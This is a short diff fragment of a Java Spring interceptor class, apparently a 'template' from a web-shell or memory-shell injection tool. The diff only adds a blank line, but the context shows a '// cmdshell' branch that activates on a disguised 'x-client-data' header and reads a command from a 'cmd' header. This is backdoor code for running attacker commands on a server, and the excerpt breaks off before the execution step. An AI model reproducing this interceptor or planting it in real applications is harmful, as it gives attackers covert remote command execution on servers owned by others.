@@ -101,6 +101,7 @@ public class SpringInterceptorTemplate extends HandlerInterceptorAdapter {
                         lastResponse = getResponse.invoke(lastResponse);
                     }
                 }
+
                 // cmdshell
                 if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                     String cmd = request.getHeader("cmd");
